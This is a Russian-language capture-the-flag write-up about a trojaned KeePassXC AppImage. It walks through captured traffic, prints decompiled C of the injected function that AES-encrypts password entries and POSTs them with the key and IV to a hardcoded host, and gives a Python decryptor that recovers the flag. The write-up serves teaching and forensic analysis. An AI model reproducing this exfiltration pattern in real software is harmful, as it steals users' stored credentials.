## Название: KeeHackXC
**Описание**: Для того, чтобы стащить пароли у пользователей, злоумышленник подменил файл KeePassXC на слегка модифицированную его версию. К счастью, мы записали трафик, и теперь можно узнать, какая информация "ушла" не в те руки.
**Флаг**: `rtctf{N0_m0r3_S3crets!}`

Решение:
Видим в трафике единственный HTTP-запрос и ответ:
```
POST / HTTP/1.1
Host: 127.0.0.1
Content-Type: application/octet-stream
Content-Length: 256
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-US,*
User-Agent: Mozilla/5.0

`..`Q"4...W...w.K?4..B...vA-..
.!..j@..'k...%...3.U..;2?}-.Z....6h/..y/$N*..!a=	.........>	..yM.......:..].A	qw.....N.......1.tL.E.dB[#~...t..^NA{dU......../..........&....1..H.T..U..f]..Pe.$.E,......+d"...N......	).
.D.L.yE.....rx.:.|..D..U..C.\.-..."....HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.11.9
Date: Thu, 10 Oct 2024 13:20:25 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2
Connection: close

ok
```

Данные зашифрованы, придётся реверсить бинарник. После распаковки AppImage (`7z x KeeHackXC.AppImage`) проходим по пути `./usr/bin`, где можно исследовать целевой бинарник `keepassxc`
Далее надо найти, какая функциональность ответственна за слив данных.  
Вариант 1: найти строчку `http://127.0.0.1/` или `application/octet-stream`.  
Вариант 2: в динамике посмотреть, где открывается tcp-шный сокет с адресом 127.0.0.1 и посмотреть стек вызовов.

Натыкаемся на подобное:
```c
LABEL_84:
      v108[0] = (void *)QString::fromAscii_helper((QString *)"http://127.0.0.1/", (const char *)&word_10 + 1, v11);
      QUrl::QUrl(v105, v108, 0LL);
      func(v108);
      sub_185C80(
        (QString *)&v96,
        (QUrl *)v105,
        v65,
        &v103,
        (int)&v96,
        (int)&v94,
        (int)v74,
        (int)v77,
        (int)v80,
        (int)v83,
        (int)v86,
        (int)v89,
        (int)v91,
        v92.m128i_i32[0],
        v92.m128i_i32[2],
        (int)v93,
        (int)v94,
        (int)v95,
        (int)v96,
        v97[0],
        v98[0],
        v99[0],
        (int)v100,
        v101[0],
        v102[0],
        (int)v103,
        v104[0],
        v105[0],
        v106,
        (int)v107,
        (int)v108[0],
        (int)v108[1],
        v109,
        v110,
        v111);
```
Функция sub_185C80:
```c
unsigned __int64 __fastcall sub_185C80(QString *a1, QUrl *a2)
{
  unsigned __int64 v2; // rdx
  Botan *v3; // r8
  unsigned __int64 v4; // rcx
  Botan::SymmetricAlgorithm *v5; // r15
  void *v6; // r14
  Botan *memory; // rax
  Botan *v8; // rdi
  Botan *v9; // r13
  signed __int64 v10; // rdx
  unsigned __int64 v11; // rax
  __int64 v12; // rax
  unsigned __int64 v13; // rsi
  Botan *v14; // rax
  signed __int64 v15; // r9
  unsigned __int64 v16; // rdx
  unsigned __int64 v17; // rcx
  volatile signed __int32 *v18; // rdi
  __int64 v19; // r15
  volatile signed __int32 *v20; // r14
  const __m128i *v21; // r15
  __int64 v22; // rax
  const __m128i *v23; // r14
  const __m128i *v24; // r13
  signed __int64 v25; // rcx
  Botan *v26; // rax
  Botan *v27; // rdx
  signed __int64 v28; // r8
  unsigned __int64 v29; // rax
  const __m128i *v30; // rax
  unsigned __int64 v31; // rdi
  Botan *v32; // rax
  signed __int64 v33; // rcx
  volatile signed __int32 *v34; // rdi
  signed __int32 v35; // et0
  volatile signed __int32 *v36; // rdi
  signed __int32 v37; // et0
  unsigned __int64 v38; // rcx
  volatile signed __int32 *v39; // rdi
  signed __int32 v40; // et0
  volatile signed __int32 *v41; // rdi
  signed __int32 v42; // et0
  __int64 v44; // rax
  __int8 v45; // al
  QNetworkAccessManager *v46; // [rsp+10h] [rbp-138h]
  char v47[8]; // [rsp+28h] [rbp-120h] BYREF
  volatile signed __int32 *v48; // [rsp+30h] [rbp-118h] BYREF
  Botan::SymmetricAlgorithm *v49; // [rsp+38h] [rbp-110h] BYREF
  volatile signed __int32 *v50; // [rsp+40h] [rbp-108h] BYREF
  volatile signed __int32 *v51; // [rsp+48h] [rbp-100h] BYREF
  _BYTE v52[16]; // [rsp+50h] [rbp-F8h] BYREF
  Botan *v53; // [rsp+60h] [rbp-E8h] BYREF
  __int64 v54; // [rsp+68h] [rbp-E0h]
  __int64 v55; // [rsp+70h] [rbp-D8h]
  Botan *v56; // [rsp+80h] [rbp-C8h] BYREF
  Botan *v57; // [rsp+88h] [rbp-C0h]
  __int64 v58; // [rsp+90h] [rbp-B8h]
  Botan *v59[2]; // [rsp+A0h] [rbp-A8h] BYREF
  char *v60; // [rsp+B0h] [rbp-98h]
  void *v61[2]; // [rsp+C0h] [rbp-88h] BYREF
  _QWORD v62[2]; // [rsp+D0h] [rbp-78h] BYREF
  void *v63; // [rsp+E0h] [rbp-68h]
  __int64 v64; // [rsp+E8h] [rbp-60h]
  _QWORD v65[3]; // [rsp+F0h] [rbp-58h] BYREF
  unsigned __int64 v66; // [rsp+108h] [rbp-40h]

  v66 = __readfsqword(0x28u);
  v46 = (QNetworkAccessManager *)operator new(0x10uLL);
  QNetworkAccessManager::QNetworkAccessManager(v46, 0LL);
  QNetworkRequest::QNetworkRequest((QNetworkRequest *)v47, a2);
  QVariant::QVariant((QVariant *)v59, "application/octet-stream");
  QNetworkRequest::setHeader(v47, 0LL, v59);
  QVariant::~QVariant((QVariant *)v59);
  QString::toUtf8_helper((QString *)&v48, a1);
  Botan::AutoSeeded_RNG::AutoSeeded_RNG((Botan::AutoSeeded_RNG *)v52, 0x400uLL);
  Botan::OctetString::OctetString((Botan::OctetString *)&v53, (Botan::RandomNumberGenerator *)v52, 0x20uLL);
  Botan::OctetString::OctetString((Botan::OctetString *)&v56, (Botan::RandomNumberGenerator *)v52, 0x10uLL);
  strcpy((char *)v62, "AES-256/CBC");
  v63 = v65;
  v64 = 0LL;
  LOBYTE(v65[0]) = 0;
  v61[0] = v62;
  v61[1] = byte_9 + 2;
  Botan::Cipher_Mode::create(&v49, v61, 0LL);
  if ( v61[0] != v62 )
    operator delete(v61[0], v62[0] + 1LL);
  if ( v63 != v65 )
    operator delete(v63, v65[0] + 1LL);
  Botan::SymmetricAlgorithm::set_key(v49, (const unsigned __int8 *)v53, v54 - (_QWORD)v53);
  v4 = (unsigned __int64)v56;
  v5 = v49;
  v6 = (void *)(v57 - v56);
  if ( v57 == v56 )
  {
    v9 = 0LL;
    goto LABEL_75;
  }
  memory = (Botan *)Botan::allocate_memory((Botan *)(v57 - v56), 1uLL, v2);
  v8 = v57;
  v4 = (unsigned __int64)v56;
  v9 = memory;
  if ( v57 == v56 )
  {
LABEL_75:
    v10 = 0LL;
    goto LABEL_22;
  }
  v10 = v57 - v56;
  v11 = v57 - v56 - 1;
  if ( v11 <= 6 || (v3 = (Botan *)((char *)v56 + 1), (unsigned __int64)(v9 - (Botan *)((char *)v56 + 1)) <= 0xE) )
  {
    v44 = 0LL;
    do
    {
      *((_BYTE *)v9 + v44) = *(_BYTE *)(v4 + v44);
      ++v44;
    }
    while ( v10 != v44 );
    goto LABEL_22;
  }
  if ( v11 <= 0xE )
  {
    v14 = v56;
    v3 = v9;
    v15 = v57 - v56;
    v13 = 0LL;
  }
  else
  {
    v12 = 0LL;
    v13 = v10 & 0xFFFFFFFFFFFFFFF0LL;
    do
    {
      *(__m128i *)((char *)v9 + v12) = _mm_loadu_si128((const __m128i *)(v4 + v12));
      v12 += 16LL;
    }
    while ( v13 != v12 );
    v3 = (Botan *)((char *)v9 + v13);
    v14 = (Botan *)(v4 + v13);
    if ( v13 == v10 )
      goto LABEL_22;
    v15 = v10 - v13;
    if ( v10 - v13 - 1 <= 6 )
      goto LABEL_15;
  }
  *(_QWORD *)((char *)v9 + v13) = *(_QWORD *)(v4 + v13);
  v4 = v15 & 0xFFFFFFFFFFFFFFF8LL;
  v3 = (Botan *)((char *)v3 + (v15 & 0xFFFFFFFFFFFFFFF8LL));
  v14 = (Botan *)((char *)v14 + (v15 & 0xFFFFFFFFFFFFFFF8LL));
  if ( (v15 & 7) == 0 )
    goto LABEL_22;
LABEL_15:
  *(_BYTE *)v3 = *(_BYTE *)v14;
  v4 = (unsigned __int64)v14 + 1;
  if ( v8 != (Botan *)((char *)v14 + 1) )
  {
    *((_BYTE *)v3 + 1) = *((_BYTE *)v14 + 1);
    v4 = (unsigned __int64)v14 + 2;
    if ( v8 != (Botan *)((char *)v14 + 2) )
    {
      *((_BYTE *)v3 + 2) = *((_BYTE *)v14 + 2);
      v4 = (unsigned __int64)v14 + 3;
      if ( v8 != (Botan *)((char *)v14 + 3) )
      {
        *((_BYTE *)v3 + 3) = *((_BYTE *)v14 + 3);
        v4 = (unsigned __int64)v14 + 4;
        if ( v8 != (Botan *)((char *)v14 + 4) )
        {
          *((_BYTE *)v3 + 4) = *((_BYTE *)v14 + 4);
          v4 = (unsigned __int64)v14 + 5;
          if ( v8 != (Botan *)((char *)v14 + 5) )
          {
            *((_BYTE *)v3 + 5) = *((_BYTE *)v14 + 5);
            v4 = (unsigned __int64)v14 + 6;
            if ( v8 != (Botan *)((char *)v14 + 6) )
              *((_BYTE *)v3 + 6) = *((_BYTE *)v14 + 6);
          }
        }
      }
    }
  }
LABEL_22:
  (*(void (__fastcall **)(Botan::SymmetricAlgorithm *, Botan *, signed __int64, unsigned __int64, Botan *))(*(_QWORD *)v5 + 48LL))(
    v5,
    v9,
    v10,
    v4,
    v3);
  if ( v9 )
    Botan::deallocate_memory(v9, v6, 1uLL, v17);
  v18 = v48;
  if ( *v48 > 1u || (v19 = *((_QWORD *)v48 + 2), v19 != 24) )
  {
    QByteArray::reallocData(&v48, (unsigned int)(*((_DWORD *)v48 + 1) + 1), (unsigned int)*((char *)v48 + 11) >> 31);
    v18 = v48;
    v19 = *((_QWORD *)v48 + 2);
  }
  v20 = v18;
  v21 = (const __m128i *)((char *)v18 + v19 + *((int *)v18 + 1));
  if ( *v18 > 1u || (v22 = *((_QWORD *)v18 + 2), v22 != 24) )
  {
    QByteArray::reallocData(&v48, (unsigned int)(*((_DWORD *)v18 + 1) + 1), (unsigned int)*((char *)v18 + 11) >> 31);
    v20 = v48;
    v22 = *((_QWORD *)v48 + 2);
  }
  v23 = (const __m128i *)((char *)v20 + v22);
  v60 = 0LL;
  v24 = v23;
  *(_OWORD *)v59 = 0LL;
  v25 = (char *)v21 - (char *)v23;
  if ( (char *)v21 - (char *)v23 < 0 )
    std::__throw_length_error("cannot create std::vector larger than max_size()");
  if ( v21 == v23 )
  {
    v27 = 0LL;
  }
  else
  {
    v26 = (Botan *)Botan::allocate_memory((Botan *)((char *)v21 - (char *)v23), 1uLL, v16);
    v25 = (char *)v21 - (char *)v23;
    v27 = v26;
  }
  v59[0] = v27;
  v60 = (char *)v27 + v25;
  if ( v21 != v23 )
  {
    v28 = (char *)v21 - (char *)v23;
    v29 = (char *)v21 - (char *)v23 - 1;
    if ( v29 <= 6 || (unsigned __int64)(v27 - (Botan *)&v23->m128i_i8[1]) <= 0xE )
    {
      do
      {
        v45 = v24->m128i_i8[0];
        v24 = (const __m128i *)((char *)v24 + 1);
        v24->m128i_i8[v27 - (Botan *)v23 - 1] = v45;
      }
      while ( v21 != v24 );
      goto LABEL_47;
    }
    if ( v29 <= 0xE )
    {
      v32 = v27;
      v33 = (char *)v21 - (char *)v23;
      v31 = 0LL;
    }
    else
    {
      v30 = v23;
      v31 = v28 & 0xFFFFFFFFFFFFFFF0LL;
      do
      {
        *(const __m128i *)((char *)v30 + v27 - (Botan *)v23) = _mm_loadu_si128(v30);
        ++v30;
      }
      while ( v30 != (const __m128i *)&v23->m128i_i8[v28 & 0xFFFFFFFFFFFFFFF0LL] );
      v32 = (Botan *)((char *)v27 + v31);
      v24 = (const __m128i *)((char *)v23 + v31);
      if ( v31 == v28 )
        goto LABEL_47;
      v33 = v28 - v31;
      if ( v28 - v31 - 1 <= 6 )
      {
LABEL_40:
        *(_BYTE *)v32 = v24->m128i_i8[0];
        if ( v21 != (const __m128i *)&v24->m128i_i8[1] )
        {
          *((_BYTE *)v32 + 1) = v24->m128i_i8[1];
          if ( v21 != (const __m128i *)&v24->m128i_i16[1] )
          {
            *((_BYTE *)v32 + 2) = v24->m128i_i8[2];
            if ( v21 != (const __m128i *)((char *)v24->m128i_i32 + 3) )
            {
              *((_BYTE *)v32 + 3) = v24->m128i_i8[3];
              if ( v21 != (const __m128i *)((char *)v24->m128i_i64 + 4) )
              {
                *((_BYTE *)v32 + 4) = v24->m128i_i8[4];
                if ( v21 != (const __m128i *)&v24->m128i_u8[5] )
                {
                  *((_BYTE *)v32 + 5) = v24->m128i_i8[5];
                  if ( v21 != (const __m128i *)&v24->m128i_u16[3] )
                    *((_BYTE *)v32 + 6) = v24->m128i_i8[6];
                }
              }
            }
          }
        }
        goto LABEL_47;
      }
    }
    *(_QWORD *)((char *)v27 + v31) = *(__int64 *)((char *)v23->m128i_i64 + v31);
    v32 = (Botan *)((char *)v32 + (v33 & 0xFFFFFFFFFFFFFFF8LL));
    v24 = (const __m128i *)((char *)v24 + (v33 & 0xFFFFFFFFFFFFFFF8LL));
    if ( (v33 & 7) != 0 )
      goto LABEL_40;
LABEL_47:
    v27 = (Botan *)((char *)v27 + v28);
  }
  v59[1] = v27;
  (*(void (__fastcall **)(Botan::SymmetricAlgorithm *, Botan **, _QWORD))(*(_QWORD *)v49 + 64LL))(v49, v59, 0LL);
  QByteArray::QByteArray((QByteArray *)&v50, (const char *)v59[0], LODWORD(v59[1]) - LODWORD(v59[0]));
  QByteArray::QByteArray((QByteArray *)&v51, (const char *)v53, v54 - (_DWORD)v53);
  QByteArray::append((QByteArray *)&v50, (const QByteArray *)&v51);
  v34 = v51;
  if ( !*v51 || *v51 != -1 && (v35 = _InterlockedSub(v51, 1u), v34 = v51, !v35) )
    QArrayData::deallocate(v34, 1LL, 8LL);
  QByteArray::QByteArray((QByteArray *)&v51, (const char *)v56, (_DWORD)v57 - (_DWORD)v56);
  QByteArray::append((QByteArray *)&v50, (const QByteArray *)&v51);
  v36 = v51;
  if ( !*v51 || *v51 != -1 && (v37 = _InterlockedSub(v51, 1u), v36 = v51, !v37) )
    QArrayData::deallocate(v36, 1LL, 8LL);
  QNetworkAccessManager::post(v46, (const QNetworkRequest *)v47, (const QByteArray *)&v50);
  v39 = v50;
  if ( !*v50 || *v50 != -1 && (v40 = _InterlockedSub(v50, 1u), v39 = v50, !v40) )
    QArrayData::deallocate(v39, 1LL, 8LL);
  if ( v59[0] )
    Botan::deallocate_memory(v59[0], (void *)(v60 - (char *)v59[0]), 1uLL, v38);
  if ( v49 )
    (*(void (__fastcall **)(Botan::SymmetricAlgorithm *))(*(_QWORD *)v49 + 8LL))(v49);
  if ( v56 )
    Botan::deallocate_memory(v56, (void *)(v58 - (_QWORD)v56), 1uLL, v38);
  if ( v53 )
    Botan::deallocate_memory(v53, (void *)(v55 - (_QWORD)v53), 1uLL, v38);
  Botan::AutoSeeded_RNG::~AutoSeeded_RNG((Botan::AutoSeeded_RNG *)v52);
  v41 = v48;
  if ( !*v48 || *v48 != -1 && (v42 = _InterlockedSub(v48, 1u), v41 = v48, !v42) )
    QArrayData::deallocate(v41, 1LL, 8LL);
  QNetworkRequest::~QNetworkRequest((QNetworkRequest *)v47);
  return v66 - __readfsqword(0x28u);
}
```
Понимаем, что используется библиотека Botan, алгоритм шифрования AES-256/CBC и ключ генерируются при помощи AutoSeeded_RNG (каждый раз ключ разный!). Далее начинается куча непонятного кода, может показаться, что это какая-то обфускация, но на самом деле компилятор просто заинлайнил некоторые части процесса шифрования. Промотав в самый низ, замечаем строки:
```c
QByteArray::QByteArray((QByteArray *)&v50, (const char *)v59[0], LODWORD(v59[1]) - LODWORD(v59[0]));
QByteArray::QByteArray((QByteArray *)&v51, (const char *)v53, v54 - (_DWORD)v53);
QByteArray::append((QByteArray *)&v50, (const QByteArray *)&v51);
...
QByteArray::QByteArray((QByteArray *)&v51, (const char *)v56, (_DWORD)v57 - (_DWORD)v56);
QByteArray::append((QByteArray *)&v50, (const QByteArray *)&v51);
...
QNetworkAccessManager::post(v46, (const QNetworkRequest *)v47, (const QByteArray *)&v50);
```
Понимаем процесс формирования тела запроса. Создаётся буфер v50 с какими-то данными, и потом в него дважды дописываются ещё данные, при этом эти данные (`v53` и `v56`) генерируются вверху функции:
```c
Botan::AutoSeeded_RNG::AutoSeeded_RNG((Botan::AutoSeeded_RNG *)v52, 1024uLL);
Botan::OctetString::OctetString((Botan::OctetString *)&v53, (Botan::RandomNumberGenerator *)v52, 0x20uLL);
Botan::OctetString::OctetString((Botan::OctetString *)&v56, (Botan::RandomNumberGenerator *)v52, 0x10uLL);
strcpy((char *)v62, "AES-256/CBC");
```
Нетрудно предположить, что в сообщение дописываются ключ и IV. Пишем декодер:
```python
# pip install pycryptodome==3.21.0

import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import binascii

def decrypt_hex_string(hex_string):
    encrypted_data = binascii.unhexlify(hex_string)

    # The last 48 bytes contain the key (32 bytes) and IV (16 bytes)
    key = encrypted_data[-48:-16]
    iv = encrypted_data[-16:]
    ciphertext = encrypted_data[:-48]

    cipher = AES.new(key, AES.MODE_CBC, iv)

    decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)

    return decrypted_data.decode('utf-8')

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 decryptor.py <hex_string>")
        sys.exit(1)

    hex_string = sys.argv[1]
    
    try:
        decrypted_message = decrypt_hex_string(hex_string)
        print("Decrypted message:", decrypted_message)
    except Exception as e:
        print(f"An error occurred: {e}")
```

Запускаем:
```sh
$ python3 decryptor.py 60bb1f60512234c47f8957e3ca8277ac4b3f3418e042bfc9f276412d0b140d1f2189c66a400b89276bf0f20825c0c3df3387557fcb3b323f7d2dac5ad7e113f336682ffc95792f244e2a2e8421613d09bebbdce0c9dbe5d6d73e0911d5794d9f05f1faffc4023a06f35dac410971779296b107114eaaf5a016e719dd3105744ce6451e64425b237ea0fde174bfe65e4e417b6455f1049388b5b385ec2f17921f95b615d98e92ee268601939431c17f48f854f30f55f5f6665de9af50651324fe452cbce9a4f6affb2b6422c4e2084ec7bcd4fa85d00929ae0dc144a54cdb7945841007f6f47278fb3a137cf0a344dce755ddc543165cc22ddc98d922e7b0e4c2
Decrypted message: title=trash,username=trash1,password=trash2;title=flag,username=flag_flag_flag,password=rtctf{N0_m0r3_S3crets!};title=more_trash,username=trashtrash,password=trashtrashtrashtrashtrashtrashtrashtrash;
```
